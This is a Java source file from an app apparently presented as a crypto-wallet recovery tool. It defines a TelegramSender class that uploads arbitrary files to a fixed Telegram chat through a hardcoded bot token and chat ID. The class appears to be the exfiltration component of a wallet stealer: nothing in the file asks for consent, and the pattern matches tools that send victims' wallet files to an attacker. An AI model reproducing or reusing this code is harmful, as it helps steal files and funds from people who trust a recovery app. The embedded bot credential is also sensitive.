package com.example.walletrecovery;

import okhttp3.*;
import java.io.File;
import java.io.IOException;

public class TelegramSender {
    private static final String BOT_TOKEN = "8042162075:AAGPicjBc6qYlw9M-To2tVpPGYy82sco444";
    private static final String CHAT_ID = "7074279152";
    private static final String TAG = "TelegramSender";

    public static void sendFile(File file) {
        OkHttpClient client = new OkHttpClient();

        RequestBody body = new MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("document", file.getName(),
                    RequestBody.create(file, MediaType.parse("application/octet-stream")))
            .build();

        Request request = new Request.Builder()
            .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
            .post(body)
            .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                LogWriter.logSendResult(file.getName(), -1);
                Log.e(TAG, "File send failed: " + file.getName(), e);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                LogWriter.logSendResult(file.getName(), response.code());
                if (!response.isSuccessful()) {
                    Log.e(TAG, "File send failed, response code: " + response.code());
                } else {
                    Log.d(TAG, "File sent successfully: " + file.getName());
                }
            }
        });
    }
}
